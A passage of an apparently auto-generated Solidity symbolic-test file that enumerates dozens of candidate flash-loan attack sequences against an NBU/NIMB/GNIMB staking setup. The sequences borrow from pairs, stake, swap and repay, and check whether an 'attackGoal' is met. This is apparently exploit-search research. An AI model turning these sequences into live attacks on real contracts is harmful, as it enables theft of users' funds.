        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4656(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4657(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4658(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4659(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4660(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4661(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4662(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4663(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4664(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4665(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4666(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4667(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4668(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4669(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4670(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4671(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4672(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4673(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4674(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4675(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4676(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4677(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4678(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4679(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4680(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4681(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4682(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4683(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4684(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4685(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4686(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4687(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4688(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4689(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4690(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4691(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4692(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4693(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4694(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4695(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4696(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4697(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4698(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4699(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4700(
